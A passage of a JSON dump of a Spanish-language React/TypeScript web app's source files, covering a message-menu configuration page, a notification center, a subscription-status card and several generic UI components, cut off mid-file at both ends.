</CardDescription>\n            </div>\n            <div className=\"flex gap-2\">\n              {hasUnsavedChanges && (\n                <Button\n                  onClick={handleSaveAllChanges}\n                  data-testid=\"button-save-all\"\n                  className=\"bg-green-600 hover:bg-green-700\"\n                >\n                  <Save className=\"w-4 h-4 mr-2\" />\n                  Guardar Cambios\n                </Button>\n              )}\n              <Button\n                onClick={() => handleAddOption(null)}\n                variant=\"outline\"\n                data-testid=\"button-add-option\"\n              >\n                <Plus className=\"w-4 h-4 mr-2\" />\n                Agregar Opci贸n\n              </Button>\n            </div>\n          </div>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          {mainMenuOptions.length === 0 ? (\n            <p className=\"text-muted-foreground text-center py-8\">\n              No hay opciones de men煤 configuradas. Haz clic en \"Agregar Opci贸n\" para crear una.\n            </p>\n          ) : (\n            <div className=\"space-y-3\">\n              {mainMenuOptions.map((option, index) => {\n                const actualIndex = editedOptions.indexOf(option);\n                return renderMenuOption(option, actualIndex, 0);\n              })}\n            </div>\n          )}\n        </CardContent>\n      </Card>\n      {/* Enviar Mensaje de Prueba */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Enviar Mensaje</CardTitle>\n          <CardDescription>\n            Env铆a un mensaje de el men煤 configurado (solo 10 d铆gitos)\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"test-number\">N煤mero de Tel茅fono (10 d铆gitos)</Label>\n            <Input\n              id=\"test-number\"\n              placeholder=\"5531781885\"\n              value={testNumber}\n              onChange={(e) => setTestNumber(e.target.value)}\n              data-testid=\"input-test-number\"\n            />\n            <p className=\"text-xs text-muted-foreground\">\n              El sistema autom谩ticamente agregar谩 el c贸digo 521 (M茅xico celular)\n            </p>\n          </div>\n\n          <Button\n            onClick={handleSendTestMessage}\n            disabled={sendTestMessageMutation.isPending}\n            data-testid=\"button-send-test\"\n          >\n            <MessageSquare className=\"w-4 h-4 mr-2\" />\n            {sendTestMessageMutation.isPending ? \"Enviando...\" : \"Enviar msj\"}\n          </Button>\n\n          {/* Vista Previa del Mensaje */}\n          {welcomeMessage && (\n            <div className=\"mt-4 p-4 bg-muted rounded-lg\">\n              <h4 className=\"font-semibold mb-2\">Vista Previa:</h4>\n              <div className=\"whitespace-pre-wrap text-sm\">\n                {welcomeMessage}\n                {mainMenuOptions.length > 0 && (\n                  <>\n                    {\"\\n\\nPor favor selecciona una opci贸n:\\n\\n\"}\n                    {mainMenuOptions\n                      .filter(opt => opt.isActive)\n                      .map((option) => (\n                        <div key={option.id || option.optionNumber}>\n                          {option.optionNumber}. {option.optionText}\n                        </div>\n                      ))}\n                  </>\n                )}\n              </div>\n            </div>\n          )}\n        </CardContent>\n      </Card>\n    </div>\n  );\n}\n","size_bytes":22164},"client/src/components/ui/notification-center.tsx":{"content":"import React, { useState, useEffect } from 'react';\nimport { Bell, CheckCircle, XCircle, AlertTriangle, Info, X, Check } from 'lucide-react';\nimport { Badge } from '@/components/ui/badge';\nimport { cn } from '@/lib/utils';\nimport { Button } from '@/components/ui/button';\nimport { \n  DropdownMenu,\n  DropdownMenuContent,\n  DropdownMenuGroup,\n  DropdownMenuItem,\n  DropdownMenuLabel,\n  DropdownMenuSeparator,\n  DropdownMenuTrigger,\n} from '@/components/ui/dropdown-menu';\nimport { ScrollArea } from '@/components/ui/scroll-area';\nimport { useAuth } from '@/hooks/use-auth';\nimport { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';\nimport { apiRequest } from '@/lib/queryClient';\nimport { NotificationType, NotificationPriority } from '@shared/schema';\n\n// Define interfaces\ninterface Notification {\n  id: number;\n  userId: number;\n  type: NotificationType;\n  title: string;\n  message: string;\n  details?: string;\n  priority: NotificationPriority;\n  read: boolean;\n  createdAt: string;\n  expiresAt?: string;\n  actionUrl?: string;\n  sessionId?: string;\n  metaData?: any;\n}\n\ninterface NotificationCenterProps {\n  className?: string;\n  limit?: number;\n}\n\n// Style utilities\nconst getPriorityStyles = (priority: NotificationPriority) => {\n  switch (priority) {\n    case 'urgent':\n      return 'bg-red-500 text-white';\n    case 'high':\n      return 'bg-orange-500 text-white';\n    case 'medium':\n      return 'bg-yellow-500 text-white';\n    case 'low':\n    default:\n      return 'bg-blue-500 text-white';\n  }\n};\n\nconst getTypeIcon = (type: NotificationType) => {\n  switch (type) {\n    case 'success':\n      return <CheckCircle className=\"h-5 w-5 text-green-500\" />;\n    case 'error':\n      return <XCircle className=\"h-5 w-5 text-red-500\" />;\n    case 'warning':\n      return <AlertTriangle className=\"h-5 w-5 text-yellow-500\" />;\n    case 'info':\n      return <Info className=\"h-5 w-5 text-blue-500\" />;\n    case 'session_activity':\n      return <Info className=\"h-5 w-5 text-purple-500\" />;\n    case 'user_activity':\n      return <Info className=\"h-5 w-5 text-cyan-500\" />;\n    case 'system':\n    default:\n      return <Info className=\"h-5 w-5 text-gray-500\" />;\n  }\n};\n\n// Component for individual notification\nconst NotificationItem = ({ \n  notification, \n  onMarkAsRead \n}: { \n  notification: Notification, \n  onMarkAsRead: (id: number) => void \n}) => {\n  const timeAgo = (date: string) => {\n    const now = new Date();\n    const past = new Date(date);\n    const diff = now.getTime() - past.getTime();\n    \n    const seconds = Math.floor(diff / 1000);\n    const minutes = Math.floor(seconds / 60);\n    const hours = Math.floor(minutes / 60);\n    const days = Math.floor(hours / 24);\n    \n    if (days > 0) return `${days}d ago`;\n    if (hours > 0) return `${hours}h ago`;\n    if (minutes > 0) return `${minutes}m ago`;\n    return 'just now';\n  };\n  \n  return (\n    <div \n      className={cn(\n        \"p-3 border-b border-gray-700 hover:bg-gray-800/50 transition-colors relative\",\n        !notification.read && \"bg-gray-800/30\"\n      )}\n    >\n      <div className=\"flex items-start gap-3\">\n        <div className=\"mt-1\">\n          {getTypeIcon(notification.type)}\n        </div>\n        <div className=\"flex-1 min-w-0\">\n          <div className=\"flex items-center justify-between\">\n            <h4 className=\"font-semibold text-white truncate pr-6\">{notification.title}</h4>\n            <span className=\"text-xs text-gray-400 whitespace-nowrap\">\n              {timeAgo(notification.createdAt)}\n            </span>\n          </div>\n          <p className=\"text-sm text-gray-300 mt-1\">{notification.message}</p>\n          {notification.details && (\n            <p className=\"text-xs text-gray-400 mt-1 line-clamp-2\">{notification.details}</p>\n          )}\n          {notification.actionUrl && (\n            <a \n              href={notification.actionUrl} \n              className=\"text-xs text-blue-400 hover:text-blue-300 mt-2 inline-block\"\n            >\n              Ver m谩s\n            </a>\n          )}\n          {!notification.read && (\n            <button\n              className=\"absolute top-3 right-3 text-gray-400 hover:text-white p-1\"\n              onClick={() => onMarkAsRead(notification.id)}\n              title=\"Marcar como le铆da\"\n            >\n              <Check className=\"h-4 w-4\" />\n            </button>\n          )}\n        </div>\n      </div>\n      {notification.priority !== 'low' && (\n        <Badge \n          variant=\"outline\" \n          className={cn(\"mt-2 text-xs\", getPriorityStyles(notification.priority))}\n        >\n          {notification.priority.toUpperCase()}\n        </Badge>\n      )}\n    </div>\n  );\n};\n\n// Main notification center component\nexport function NotificationCenter({ className, limit = 10 }: NotificationCenterProps) {\n  const { user } = useAuth();\n  const [isOpen, setIsOpen] = useState(false);\n  const queryClient = useQueryClient();\n  \n  // Queries\n  const { \n    data: notifications = [], \n    isLoading,\n    refetch\n  } = useQuery<Notification[]>({\n    queryKey: ['/api/notifications'],\n    queryFn: getQueryFn({ on401: 'returnNull' }),\n    enabled: !!user,\n  });\n  \n  const { \n    data: unreadCount = 0,\n    refetch: refetchCount\n  } = useQuery<number>({\n    queryKey: ['/api/notifications/unread/count'],\n    queryFn: getQueryFn({ on401: 'returnNull' }),\n    enabled: !!user,\n  });\n  \n  // Mutations\n  const markAsReadMutation = useMutation({\n    mutationFn: async (id: number) => {\n      const res = await apiRequest('POST', `/api/notifications/${id}/read`);\n      return await res.json();\n    },\n    onSuccess: () => {\n      refetch();\n      refetchCount();\n    }\n  });\n  \n  const markAllAsReadMutation = useMutation({\n    mutationFn: async () => {\n      const res = await apiRequest('POST', '/api/notifications/read-all');\n      return await res.json();\n    },\n    onSuccess: () => {\n      refetch();\n      refetchCount();\n    }\n  });\n  \n  const handleMarkAsRead = (id: number) => {\n    markAsReadMutation.mutate(id);\n  };\n  \n  const handleMarkAllAsRead = () => {\n    markAllAsReadMutation.mutate();\n  };\n  \n  // Effect to refetch on window focus\n  useEffect(() => {\n    if (user) {\n      const intervalId = setInterval(() => {\n        refetchCount();\n      }, 60000); // Check for new notifications every minute\n      \n      return () => clearInterval(intervalId);\n    }\n  }, [user, refetchCount]);\n  \n  if (!user) return null;\n  \n  return (\n    <DropdownMenu open={isOpen} onOpenChange={setIsOpen}>\n      <DropdownMenuTrigger asChild>\n        <Button \n          variant=\"ghost\" \n          size=\"icon\" \n          className={cn(\"relative\", className)}\n        >\n          <Bell className=\"h-5 w-5\" />\n          {unreadCount > 0 && (\n            <Badge \n              className=\"absolute -top-1 -right-1 px-1.5 py-0.5 min-w-[1.5rem] h-[1.5rem] bg-red-500 text-white\" \n              variant=\"outline\"\n            >\n              {unreadCount > 99 ? '99+' : unreadCount}\n            </Badge>\n          )}\n        </Button>\n      </DropdownMenuTrigger>\n      <DropdownMenuContent \n        className=\"w-80 md:w-96 bg-gray-900 border-gray-700 text-white p-0\" \n        align=\"end\"\n      >\n        <DropdownMenuLabel className=\"flex items-center justify-between py-4 px-5 border-b border-gray-700\">\n          <span className=\"text-lg font-semibold\">Notificaciones</span>\n          {unreadCount > 0 && (\n            <Button\n              variant=\"ghost\"\n              size=\"sm\"\n              className=\"text-xs text-gray-400 hover:text-white\"\n              onClick={handleMarkAllAsRead}\n            >\n              Marcar todas como le铆das\n            </Button>\n          )}\n        </DropdownMenuLabel>\n        <ScrollArea className=\"h-[50vh] max-h-[400px]\">\n          {isLoading ? (\n            <div className=\"flex items-center justify-center h-20\">\n              <div className=\"animate-spin h-6 w-6 border-2 border-white border-t-transparent rounded-full\" />\n            </div>\n          ) : notifications.length === 0 ? (\n            <div className=\"p-6 text-center text-gray-400\">\n              <div className=\"flex justify-center mb-3\">\n                <Bell className=\"h-8 w-8 opacity-20\" />\n              </div>\n              <p>No tienes notificaciones</p>\n            </div>\n          ) : (\n            <div>\n              {notifications.map((notification) => (\n                <NotificationItem \n                  key={notification.id} \n                  notification={notification}\n                  onMarkAsRead={handleMarkAsRead}\n                />\n              ))}\n            </div>\n          )}\n        </ScrollArea>\n        <DropdownMenuSeparator className=\"bg-gray-700\" />\n        <DropdownMenuItem \n          className=\"text-center py-2 hover:bg-gray-800 cursor-pointer transition-colors text-blue-400 hover:text-blue-300\"\n          onClick={() => {\n            setIsOpen(false);\n            // Navigate to notification preferences (you can implement this)\n          }}\n        >\n          Preferencias de notificaci贸n\n        </DropdownMenuItem>\n      </DropdownMenuContent>\n    </DropdownMenu>\n  );\n}\n\n// Utility function for query fetching\nfunction getQueryFn({ on401 = \"error\" }: { on401?: \"error\" | \"returnNull\" } = {}) {\n  return async ({ queryKey }: { queryKey: [string, ...any[]] }) => {\n    const [url, ...params] = queryKey;\n    \n    try {\n      const res = await apiRequest(\"GET\", url, ...params);\n      \n      if (res.status === 401) {\n        if (on401 === \"returnNull\") return null;\n        throw new Error(\"Unauthorized\");\n      }\n      \n      return await res.json();\n    } catch (err) {\n      console.error(`Error fetching ${url}:`, err);\n      throw err;\n    }\n  };\n}","size_bytes":9682},"client/src/pages/not-found.tsx":{"content":"import { Card, CardContent } from \"@/components/ui/card\";\nimport { AlertCircle } from \"lucide-react\";\n\nexport default function NotFound() {\n  return (\n    <div className=\"min-h-screen w-full flex items-center justify-center bg-gray-50\">\n      <Card className=\"w-full max-w-md mx-4\">\n        <CardContent className=\"pt-6\">\n          <div className=\"flex mb-4 gap-2\">\n            <AlertCircle className=\"h-8 w-8 text-red-500\" />\n            <h1 className=\"text-2xl font-bold text-gray-900\">404 Page Not Found</h1>\n          </div>\n\n          <p className=\"mt-4 text-sm text-gray-600\">\n            Did you forget to add the page to the router?\n          </p>\n        </CardContent>\n      </Card>\n    </div>\n  );\n}\n","size_bytes":711},"client/src/components/ui/accordion.tsx":{"content":"import * as React from \"react\"\nimport * as AccordionPrimitive from \"@radix-ui/react-accordion\"\nimport { ChevronDown } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Accordion = AccordionPrimitive.Root\n\nconst AccordionItem = React.forwardRef<\n  React.ElementRef<typeof AccordionPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof AccordionPrimitive.Item>\n>(({ className, ...props }, ref) => (\n  <AccordionPrimitive.Item\n    ref={ref}\n    className={cn(\"border-b\", className)}\n    {...props}\n  />\n))\nAccordionItem.displayName = \"AccordionItem\"\n\nconst AccordionTrigger = React.forwardRef<\n  React.ElementRef<typeof AccordionPrimitive.Trigger>,\n  React.ComponentPropsWithoutRef<typeof AccordionPrimitive.Trigger>\n>(({ className, children, ...props }, ref) => (\n  <AccordionPrimitive.Header className=\"flex\">\n    <AccordionPrimitive.Trigger\n      ref={ref}\n      className={cn(\n        \"flex flex-1 items-center justify-between py-4 font-medium transition-all hover:underline [&[data-state=open]>svg]:rotate-180\",\n        className\n      )}\n      {...props}\n    >\n      {children}\n      <ChevronDown className=\"h-4 w-4 shrink-0 transition-transform duration-200\" />\n    </AccordionPrimitive.Trigger>\n  </AccordionPrimitive.Header>\n))\nAccordionTrigger.displayName = AccordionPrimitive.Trigger.displayName\n\nconst AccordionContent = React.forwardRef<\n  React.ElementRef<typeof AccordionPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof AccordionPrimitive.Content>\n>(({ className, children, ...props }, ref) => (\n  <AccordionPrimitive.Content\n    ref={ref}\n    className=\"overflow-hidden text-sm transition-all data-[state=closed]:animate-accordion-up data-[state=open]:animate-accordion-down\"\n    {...props}\n  >\n    <div className={cn(\"pb-4 pt-0\", className)}>{children}</div>\n  </AccordionPrimitive.Content>\n))\n\nAccordionContent.displayName = AccordionPrimitive.Content.displayName\n\nexport { Accordion, AccordionItem, AccordionTrigger, AccordionContent }\n","size_bytes":1977},"client/src/components/ui/toggle.tsx":{"content":"import * as React from \"react\"\nimport * as TogglePrimitive from \"@radix-ui/react-toggle\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst toggleVariants = cva(\n  \"inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors hover:bg-muted hover:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=on]:bg-accent data-[state=on]:text-accent-foreground\",\n  {\n    variants: {\n      variant: {\n        default: \"bg-transparent\",\n        outline:\n          \"border border-input bg-transparent hover:bg-accent hover:text-accent-foreground\",\n      },\n      size: {\n        default: \"h-10 px-3\",\n        sm: \"h-9 px-2.5\",\n        lg: \"h-11 px-5\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n      size: \"default\",\n    },\n  }\n)\n\nconst Toggle = React.forwardRef<\n  React.ElementRef<typeof TogglePrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof TogglePrimitive.Root> &\n    VariantProps<typeof toggleVariants>\n>(({ className, variant, size, ...props }, ref) => (\n  <TogglePrimitive.Root\n    ref={ref}\n    className={cn(toggleVariants({ variant, size, className }))}\n    {...props}\n  />\n))\n\nToggle.displayName = TogglePrimitive.Root.displayName\n\nexport { Toggle, toggleVariants }\n","size_bytes":1435},"vite.config.ts":{"content":"import { defineConfig } from \"vite\";\nimport react from \"@vitejs/plugin-react\";\nimport themePlugin from \"@replit/vite-plugin-shadcn-theme-json\";\nimport path from \"path\";\nimport runtimeErrorOverlay from \"@replit/vite-plugin-runtime-error-modal\";\n\nexport default defineConfig({\n  plugins: [\n    react(),\n    runtimeErrorOverlay(),\n    themePlugin(),\n    ...(process.env.NODE_ENV !== \"production\" &&\n    process.env.REPL_ID !== undefined\n      ? [\n          await import(\"@replit/vite-plugin-cartographer\").then((m) =>\n            m.cartographer(),\n          ),\n        ]\n      : []),\n  ],\n  resolve: {\n    alias: {\n      \"@\": path.resolve(import.meta.dirname, \"client\", \"src\"),\n      \"@shared\": path.resolve(import.meta.dirname, \"shared\"),\n      \"@assets\": path.resolve(import.meta.dirname, \"attached_assets\"),\n    },\n  },\n  root: path.resolve(import.meta.dirname, \"client\"),\n  build: {\n    outDir: path.resolve(import.meta.dirname, \"dist/public\"),\n    emptyOutDir: true,\n  },\n});\n","size_bytes":978},"client/src/components/admin/SubscriptionInfo.tsx":{"content":"import React, { useEffect, useState } from 'react';\nimport { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Badge } from '@/components/ui/badge';\nimport { Check, X, Clock, AlertCircle, Calendar, RefreshCw } from 'lucide-react';\nimport { formatDate } from '@/utils/helpers';\nimport { useQuery } from '@tanstack/react-query';\nimport { getQueryFn, queryClient } from '@/lib/queryClient';\nimport { Skeleton } from '@/components/ui/skeleton';\nimport { Button } from '@/components/ui/button';\nimport { useMediaQuery } from '@/hooks/use-media-query';\n\ninterface SubscriptionData {\n  isActive: boolean;\n  isPaid: boolean;\n  isAdmin: boolean;\n  expiresAt: string | null;\n  daysRemaining: number | null;\n  hoursRemaining: number | null;\n  message: string;\n}\n\nconst SubscriptionInfo: React.FC = () => {\n  const [isExpiringSoon, setIsExpiringSoon] = useState(false);\n  const isDesktop = useMediaQuery(\"(min-width: 768px)\");\n  \n  // Consultar la informaci贸n de suscripci贸n\n  const { data, isLoading, error } = useQuery<SubscriptionData>({\n    queryKey: ['/api/user/subscription'],\n    queryFn: getQueryFn({ on401: \"returnNull\" }),\n    refetchInterval: 3600000, // Refrescar cada hora (3600000 ms)\n  });\n  \n  useEffect(() => {\n    if (data && !data.isAdmin && data.expiresAt) {\n      // Si queda menos de un d铆a, consideramos que est谩 expirando pronto\n      const isExpiring = (data.daysRemaining === 0 && data.hoursRemaining !== null && data.hoursRemaining < 24) || \n                          (data.daysRemaining !== null && data.daysRemaining <= 1);\n      setIsExpiringSoon(isExpiring);\n    }\n  }, [data]);\n  \n  if (isLoading) {\n    return (\n      <Card>\n        <CardHeader className=\"pb-2\">\n          <CardTitle className=\"text-base\">Estado de Suscripci贸n</CardTitle>\n          <CardDescription>Cargando informaci贸n...</CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Skeleton className=\"h-12 w-full\" />\n        </CardContent>\n      </Card>\n    );\n  }\n  \n  if (error || !data) {\n    return (\n      <Card className=\"border-red-200\">\n        <CardHeader className=\"pb-2\">\n          <CardTitle className=\"text-base\">Estado de Suscripci贸n</CardTitle>\n          <CardDescription>Error al cargar informaci贸n</CardDescription>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex items-center text-red-500\">\n            <AlertCircle className=\"w-4 h-4 mr-2\" />\n            <span>No se pudo cargar la informaci贸n de suscripci贸n</span>\n          </div>\n        </CardContent>\n      </Card>\n    );\n  }\n  \n  // Si es administrador, mostrar un mensaje especial\n  if (data.isAdmin) {\n    if (isDesktop) {\n      // Versi贸n compacta para escritorio\n      return (\n        <Card className=\"w-full\">\n          <CardHeader className=\"p-2\">\n            <div className=\"flex items-center justify-between\">\n              <div className=\"flex items-center gap-2\">\n                <Badge className=\"bg-blue-500 text-white hover:bg-blue-500/80\">\n                  <Check className=\"w-3 h-3 mr-1\" /> Admin\n                </Badge>\n                <span className=\"text-xs text-muted-foreground\">Acceso completo</span>\n              </div>\n              <Button \n                variant=\"ghost\" \n                size=\"sm\" \n                onClick={() => queryClient.invalidateQueries({ queryKey: ['/api/user/subscription'] })}\n                className=\"h-6 w-6 p-0\"\n                title=\"Actualizar informaci贸n\"\n              >\n                <RefreshCw className=\"h-3 w-3\" />\n              </Button>\n            </div>\n          </CardHeader>\n        </Card>\n      );\n    }\n\n    // Versi贸n normal para m贸vil\n    return (\n      <Card>\n        <CardHeader className=\"pb-2\">\n          <CardTitle className=\"text-base\">Estado de Cuenta</CardTitle>\n          <CardDescription>Administrador del sistema</CardDescription>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex items-center\">\n            <Badge className=\"bg-blue-500 text-white hover:bg-blue-500/80\">\n              <Check className=\"w-3 h-3 mr-1\" /> Administrador\n            </Badge>\n            <span className=\"ml-2 text-sm text-muted-foreground\">\n              Acceso completo al sistema\n            </span>\n          </div>\n        </CardContent>\n      </Card>\n    );\n  }\n  \n  // Funci贸n para refrescar manualmente la informaci贸n\n  const handleRefresh = () => {\n    queryClient.invalidateQueries({ queryKey: ['/api/user/subscription'] });\n  };\n  \n  // Versi贸n de escritorio, m谩s compacta\n  if (isDesktop) {\n    return (\n      <Card className={isExpiringSoon ? 'border-orange-300' : (data.isPaid ? 'border-green-200' : 'border-red-200')}>\n        <CardHeader className=\"p-2\">\n          <div className=\"flex items-center justify-between\">\n            <div className=\"flex items-center gap-2\">\n              {data.isActive ? (\n                <Badge className=\"bg-green-500 text-white hover:bg-green-500/80\">\n                  <Check className=\"w-3 h-3 mr-1\" /> Activo\n                </Badge>\n              ) : (\n                <Badge variant=\"destructive\">\n                  <X className=\"w-3 h-3 mr-1\" /> Inactivo\n                </Badge>\n              )}\n              \n              {data.expiresAt && data.isPaid && (\n                <span className=\"text-xs text-muted-foreground flex items-center\">\n                  <Calendar className=\"w-3 h-3 mr-1\" />\n                  {data.daysRemaining === 0 \n                    ? `${data.hoursRemaining}h restantes` \n                    : `${data.daysRemaining}d ${data.hoursRemaining}h restantes`}\n                </span>\n              )}\n            </div>\n            <Button \n              variant=\"ghost\" \n              size=\"sm\" \n              onClick={handleRefresh}\n              className=\"h-6 w-6 p-0\"\n              title=\"Actualizar informaci贸n\"\n            >\n              <RefreshCw className=\"h-3 w-3\" />\n            </Button>\n          </div>\n        </CardHeader>\n      </Card>\n    );\n  }\n  \n  // Versi贸n m贸vil, completa\n  return (\n    <Card className={isExpiringSoon ? 'border-orange-300' : (data.isPaid ? 'border-green-200' : 'border-red-200')}>\n      <CardHeader className=\"pb-2\">\n        <div className=\"flex justify-between items-center\">\n          <div>\n            <CardTitle className=\"text-base\">Estado de Suscripci贸n</CardTitle>\n            <CardDescription>\n              {data.isPaid ? 'Suscripci贸n activa' : 'Suscripci贸n inactiva'}\n            </CardDescription>\n          </div>\n          <Button \n            variant=\"ghost\" \n            size=\"sm\" \n            onClick={handleRefresh}\n            className=\"h-8 w-8 p-0\"\n            title=\"Actualizar informaci贸n\"\n          >\n            <RefreshCw className=\"h-4 w-4\" />\n          </Button>\n        </div>\n      </CardHeader>\n      <CardContent>\n        <div className=\"space-y-3\">\n          <div className=\"flex items-center\">\n            {data.isActive ? (\n              <Badge className=\"bg-green-500 text-white hover:bg-green-500/80\">\n                <Check className=\"w-3 h-3 mr-1\" /> Activo\n              </Badge>\n            ) : (\n              <Badge variant=\"destructive\">\n                <X className=\"w-3 h-3 mr-1\" /> Inactivo\n              </Badge>\n            )}\n            \n            {data.expiresAt && (\n              <span className=\"ml-2 text-sm flex items-center\">\n                <Clock className=\"w-3 h-3 mr-1\" /> \n                Expira: {formatDate(new Date(data.expiresAt))}\n              </span>\n            )}\n          </div>\n          \n          {data.expiresAt && data.isPaid && (\n            <div className=\"text-sm flex items-center\">\n              <Calendar className=\"w-3 h-3 mr-1\" />\n              <span className={isExpiringSoon ? 'text-orange-500 font-medium' : 'text-muted-foreground'}>\n                {data.daysRemaining === 0 \n                  ? `${data.hoursRemaining} horas restantes` \n                  : `${data.daysRemaining} d铆as y ${data.hoursRemaining} horas restantes`}\n              </span>\n            </div>\n          )}\n          \n          <div className={`text-sm mt-2 ${isExpiringSoon ? 'text-orange-500' : (data.isPaid ? 'text-green-600' : 'text-red-500')}`}>\n            {data.message}\n          </div>\n          \n          {!data.isPaid && (\n            <div className=\"mt-3 text-sm text-blue-500\">\n              Contacta al administrador en Telegram: @BalonxSistema para renovar tu suscripci贸n\n            </div>\n          )}\n        </div>\n      </CardContent>\n    </Card>\n  );\n};\n\nexport default SubscriptionInfo;","size_bytes":8597},"client/src/components/ui/carousel.tsx":{"content":"import * as React from \"react\"\nimport useEmblaCarousel, {\n  type UseEmblaCarouselType,\n} from \"embla-carousel-react\"\nimport { ArrowLeft, ArrowRight } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\nimport { Button } from \"@/components/ui/button\"\n\ntype CarouselApi = UseEmblaCarouselType[1]\ntype UseCarouselParameters = Parameters<typeof useEmblaCarousel>\ntype CarouselOptions = UseCarouselParameters[0]\ntype CarouselPlugin = UseCarouselParameters[1]\n\ntype CarouselProps = {\n  opts?: CarouselOptions\n  plugins?: CarouselPlugin\n  orientation?: \"horizontal\" | \"vertical\"\n  setApi?: (api: CarouselApi) => void\n}\n\ntype CarouselContextProps = {\n  carouselRef: ReturnType<typeof useEmblaCarousel>[0]\n  api: ReturnType<typeof useEmblaCarousel>[1]\n  scrollPrev: () => void\n  scrollNext: () => void\n  canScrollPrev: boolean\n  canScrollNext: boolean\n} & CarouselProps\n\nconst CarouselContext = React.createContext<CarouselContextProps | null>(null)\n\nfunction useCarousel() {\n  const context = React.useContext(CarouselContext)\n\n  if (!context) {\n    throw new Error(\"useCarousel must be used within a <Carousel />\")\n  }\n\n  return context\n}\n\nconst Carousel = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement> & CarouselProps\n>(\n  (\n    {\n      orientation = \"horizontal\",\n      opts,\n      setApi,\n      plugins,\n      className,\n      children,\n      ...props\n    },\n    ref\n  ) => {\n    const [carouselRef, api] = useEmblaCarousel(\n      {\n        ...opts,\n        axis: orientation === \"horizontal\" ? \"x\" : \"y\",\n      },\n      plugins\n    )\n    const [canScrollPrev, setCanScrollPrev] = React.useState(false)\n    const [canScrollNext, setCanScrollNext] = React.useState(false)\n\n    const onSelect = React.useCallback((api: CarouselApi) => {\n      if (!api) {\n        return\n      }\n\n      setCanScrollPrev(api.canScrollPrev())\n      setCanScrollNext(api.canScrollNext())\n    }, [])\n\n    const scrollPrev = React.useCallback(() => {\n      api?.scrollPrev()\n    }, [api])\n\n    const scrollNext = React.useCallback(() => {\n      api?.scrollNext()\n    }, [api])\n\n    const handleKeyDown = React.useCallback(\n      (event: React.KeyboardEvent<HTMLDivElement>) => {\n        if (event.key === \"ArrowLeft\") {\n          event.preventDefault()\n          scrollPrev()\n        } else if (event.key === \"ArrowRight\") {\n          event.preventDefault()\n          scrollNext()\n        }\n      },\n      [scrollPrev, scrollNext]\n    )\n\n    React.useEffect(() => {\n      if (!api || !setApi) {\n        return\n      }\n\n      setApi(api)\n    }, [api, setApi])\n\n    React.useEffect(() => {\n      if (!api) {\n        return\n      }\n\n      onSelect(api)\n      api.on(\"reInit\", onSelect)\n      api.on(\"select\", onSelect)\n\n      return () => {\n        api?.off(\"select\", onSelect)\n      }\n    }, [api, onSelect])\n\n    return (\n      <CarouselContext.Provider\n        value={{\n          carouselRef,\n          api: api,\n          opts,\n          orientation:\n            orientation || (opts?.axis === \"y\" ? \"vertical\" : \"horizontal\"),\n          scrollPrev,\n          scrollNext,\n          canScrollPrev,\n          canScrollNext,\n        }}\n      >\n        <div\n          ref={ref}\n          onKeyDownCapture={handleKeyDown}\n          className={cn(\"relative\", className)}\n          role=\"region\"\n          aria-roledescription=\"carousel\"\n          {...props}\n        >\n          {children}\n        </div>\n      </CarouselContext.Provider>\n    )\n  }\n)\nCarousel.displayName = \"Carousel\"\n\nconst CarouselContent = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => {\n  const { carouselRef, orientation } = useCarousel()\n\n  return (\n    <div ref={carouselRef} className=\"overflow-hidden\">\n      <div\n        ref={ref}\n        className={cn(\n          \"flex\",\n          orientation === \"horizontal\" ? \"-ml-4\" : \"-mt-4 flex-col\",\n          className\n        )}\n        {...props}\n      />\n    </div>\n  )\n})\nCarouselContent.displayName = \"CarouselContent\"\n\nconst CarouselItem = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => {\n  const { orientation } = useCarousel()\n\n  return (\n    <div\n      ref={ref}\n      role=\"group\"\n      aria-roledescription=\"slide\"\n      className={cn(\n        \"min-w-0 shrink-0 grow-0 basis-full\",\n        orientation === \"horizontal\" ? \"pl-4\" : \"pt-4\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nCarouselItem.displayName = \"CarouselItem\"\n\nconst CarouselPrevious = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<typeof Button>\n>(({ className, variant = \"outline\", size = \"icon\", ...props }, ref) => {\n  const { orientation, scrollPrev, canScrollPrev } = useCarousel()\n\n  return (\n    <Button\n      ref={ref}\n      variant={variant}\n      size={size}\n      className={cn(\n        \"absolute  h-8 w-8 rounded-full\",\n        orientation === \"horizontal\"\n          ? \"-left-12 top-1/2 -translate-y-1/2\"\n          : \"-top-12 left-1/2 -translate-x-1/2 rotate-90\",\n        className\n      )}\n      disabled={!canScrollPrev}\n      onClick={scrollPrev}\n      {...props}\n    >\n      <ArrowLeft className=\"h-4 w-4\" />\n      <span className=\"sr-only\">Previous slide</span>\n    </Button>\n  )\n})\nCarouselPrevious.displayName = \"CarouselPrevious\"\n\nconst CarouselNext = React.forwardRef<\n  HTMLButtonElement,\n  React.ComponentProps<typeof Button>\n>(({ className, variant = \"outline\", size = \"icon\", ...props }, ref) => {\n  const { orientation, scrollNext, canScrollNext } = useCarousel()\n\n  return (\n    <Button\n      ref={ref}\n      variant={variant}\n      size={size}\n      className={cn(\n        \"absolute h-8 w-8 rounded-full\",\n        orientation === \"horizontal\"\n          ? \"-right-12 